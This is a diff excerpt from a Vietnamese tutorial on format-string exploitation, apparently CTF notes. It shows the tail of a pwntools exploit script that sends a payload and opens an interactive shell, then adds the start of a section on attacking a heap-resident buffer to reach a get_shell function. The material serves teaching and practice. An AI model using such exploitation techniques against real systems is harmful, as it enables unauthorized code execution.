@@ -700,9 +700,17 @@ Một khi chương trình cộng thêm `0x3d90` để đến `.fini_array`, lu�
 	    data2[order[1]],
 	    data2[order[2]],
 	)
-	
 	p.sendlineafter(b'something: ',payload)
 	p.sendlineafter(b'>',b'y')
 
 	p.interactive()
+
+# Dùng con trỏ Stack để thay đổi dữ liệu
+
+![Alt text](image/fs46.png)
+
+Chương trình có 1 lỗ hổng *format string*. Mục tiêu khai thác lần này vẫn là hàm `get_shell` trong chương trình.
+
+Nhưng có 1 lưu ý đặc biệt là buffer nằm trên phân vùng Heap. Điều đó có nghĩa rằng khả năng khai thác trên Stack sẽ trở nên hạn chế. 
+
 
